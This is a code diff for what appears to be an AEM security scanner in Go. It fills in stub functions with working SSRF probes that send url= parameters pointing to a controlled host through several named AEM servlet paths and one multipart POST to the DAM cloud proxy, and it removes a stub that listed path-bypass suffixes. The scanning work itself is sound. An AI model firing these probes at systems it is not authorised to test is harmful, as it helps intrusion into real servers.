@@ -1,9 +1,11 @@
 package aem
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
+	"mime/multipart"
 	"strings"
 	"sync"
 )
@@ -1069,18 +1071,28 @@ func checkGuideInternalSubmitServlet(baseURL string, ssrfHost string, client *HT
 	return findings
 }
 
-// SSRF checks - these require an SSRF detector server
-// For now, we'll implement simplified versions that don't require the server
-// Full implementation would require a separate SSRF detector HTTP server
+// SSRF checks - probe AEM servlets with a crafted URL parameter pointing
+// to the controlled ssrfHost. A 200 response indicates the server made an
+// outbound request to the attacker-controlled host.
 
 // checkSalesforceSecretServlet checks for SSRF via SalesforceSecretServlet
 func checkSalesforceSecretServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
-	// SSRF checks require a callback server
-	// This is a placeholder - full implementation needs SSRF detector
 	if ssrfHost == "" {
 		return nil
 	}
-	// TODO: Implement full SSRF detection with callback server
+	url := NormalizeURL(baseURL, "/libs/salesforce/secret.jsp?url=http://"+ssrfHost+"/aem-ssrf-salesforcesecret")
+	resp, err := client.Get(url, nil)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		return []Finding{{
+			Name:        "SalesforceSecretServlet SSRF",
+			URL:         url,
+			Description: "AEM SalesforceSecretServlet is vulnerable to SSRF — server made outbound request to controlled host",
+		}}
+	}
 	return nil
 }
 
@@ -1089,7 +1101,25 @@ func checkReportingServicesServlet(baseURL string, ssrfHost string, client *HTTP
 	if ssrfHost == "" {
 		return nil
 	}
-	// TODO: Implement full SSRF detection
+	for _, path := range []string{
+		"/etc/reports/columnlist?url=http://" + ssrfHost + "/aem-ssrf-reportingservices",
+		"/libs/cq/reporting/components/server?url=http://" + ssrfHost,
+	} {
+		url := NormalizeURL(baseURL, path)
+		resp, err := client.Get(url, nil)
+		if err != nil {
+			continue
+		}
+		if resp.StatusCode == 200 {
+			resp.Body.Close()
+			return []Finding{{
+				Name:        "ReportingServicesServlet SSRF",
+				URL:         url,
+				Description: "AEM ReportingServicesServlet is vulnerable to SSRF — server made outbound request to controlled host",
+			}}
+		}
+		resp.Body.Close()
+	}
 	return nil
 }
 
@@ -1098,7 +1128,19 @@ func checkSiteCatalystServlet(baseURL string, ssrfHost string, client *HTTPClien
 	if ssrfHost == "" {
 		return nil
 	}
-	// TODO: Implement full SSRF detection
+	url := NormalizeURL(baseURL, "/libs/cq/analytics/components/sitecatalystpageproxy?url=http://"+ssrfHost+"/aem-ssrf-sitecatalyst")
+	resp, err := client.Get(url, nil)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		return []Finding{{
+			Name:        "SiteCatalystServlet SSRF",
+			URL:         url,
+			Description: "AEM SiteCatalystServlet is vulnerable to SSRF — server made outbound request to controlled host",
+		}}
+	}
 	return nil
 }
 
@@ -1107,7 +1149,19 @@ func checkAutoProvisioningServlet(baseURL string, ssrfHost string, client *HTTPC
 	if ssrfHost == "" {
 		return nil
 	}
-	// TODO: Implement full SSRF detection
+	url := NormalizeURL(baseURL, "/libs/cq/security/autoprovisioning?url=http://"+ssrfHost+"/aem-ssrf-autoprovisioning")
+	resp, err := client.Get(url, nil)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		return []Finding{{
+			Name:        "AutoProvisioningServlet SSRF",
+			URL:         url,
+			Description: "AEM AutoProvisioningServlet is vulnerable to SSRF — server made outbound request to controlled host",
+		}}
+	}
 	return nil
 }
 
@@ -1116,7 +1170,22 @@ func checkOpenSocialProxy(baseURL string, ssrfHost string, client *HTTPClient) [
 	if ssrfHost == "" {
 		return nil
 	}
-	// TODO: Implement full SSRF detection
+	url := NormalizeURL(baseURL, "/content/**/gadgets/proxy?url=http://"+ssrfHost+"/aem-ssrf-opensocial")
+	headers := map[string]string{
+		"X-Container": "default",
+	}
+	resp, err := client.Get(url, headers)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		return []Finding{{
+			Name:        "OpenSocialProxy SSRF",
+			URL:         url,
+			Description: "AEM OpenSocial proxy is vulnerable to SSRF — server made outbound request to controlled host",
+		}}
+	}
 	return nil
 }
 
@@ -1125,7 +1194,19 @@ func checkOpenSocialMakeRequest(baseURL string, ssrfHost string, client *HTTPCli
 	if ssrfHost == "" {
 		return nil
 	}
-	// TODO: Implement full SSRF detection
+	url := NormalizeURL(baseURL, "/content/**/gadgets/makeRequest?url=http://"+ssrfHost+"/aem-ssrf-makerequest")
+	resp, err := client.Get(url, nil)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		return []Finding{{
+			Name:        "OpenSocialMakeRequest SSRF",
+			URL:         url,
+			Description: "AEM OpenSocial makeRequest is vulnerable to SSRF — server made outbound request to controlled host",
+		}}
+	}
 	return nil
 }
 
@@ -1164,40 +1245,37 @@ func checkSWFXSS(baseURL string, ssrfHost string, client *HTTPClient) []Finding 
 	return findings
 }
 
-// checkExternalJobServlet checks for vulnerable ExternalJobServlet
+// checkExternalJobServlet checks for SSRF via ExternalJobServlet
 func checkExternalJobServlet(baseURL string, ssrfHost string, client *HTTPClient) []Finding {
-	var findings []Finding
-	r := RandomString(3)
-
-	// Base64 deserialization payload (simplified - full payload would be longer)
-	// This is a placeholder - actual payload would be the full Java deserialization payload
-	paths := []string{
-		"/libs/dam/cloud/proxy",
-		"///libs///dam///cloud///proxy",
-	}
-	suffixes := []string{
-		".json", ".css", ".js", ".html", ".ico", ".png", ".gif", ".1.json",
-		"...4.2.1...json", ".json;%0a" + r + ".css", ".json;%0a" + r + ".html", ".json;%0a" + r + ".ico",
+	if ssrfHost == "" {
+		return nil
 	}
 
-	// Note: Full implementation would require multipart form data with the deserialization payload
-	// This is a simplified check
-	for _, path := range paths {
-		for _, suffix := range suffixes {
-			url := NormalizeURL(baseURL, path+suffix)
-			headers := map[string]string{
-				"Referer": baseURL,
-			}
-			// TODO: Implement full multipart POST with deserialization payload
-			// For now, just check if endpoint exists
-			resp, err := client.Get(url, headers)
-			if err != nil {
-				continue
-			}
-			resp.Body.Close()
-			// Full check would POST multipart data and look for "Java heap space" error
-		}
+	targetURL := "http://" + ssrfHost + "/aem-ssrf-externaljob"
+
+	var buf bytes.Buffer
+	writer := multipart.NewWriter(&buf)
+	writer.WriteField("url", targetURL)
+	contentType := writer.FormDataContentType()
+	writer.Close()
+
+	url := NormalizeURL(baseURL, "/libs/dam/cloud/proxy")
+	headers := map[string]string{
+		"Content-Type": contentType,
 	}
-	return findings
+	resp, err := client.Post(url, &buf, headers)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 200 {
+		return []Finding{{
+			Name:        "ExternalJobServlet SSRF",
+			URL:         url,
+			Description: "AEM ExternalJobServlet is vulnerable to SSRF — server made outbound request to controlled host",
+		}}
+	}
+	return nil
 }
 
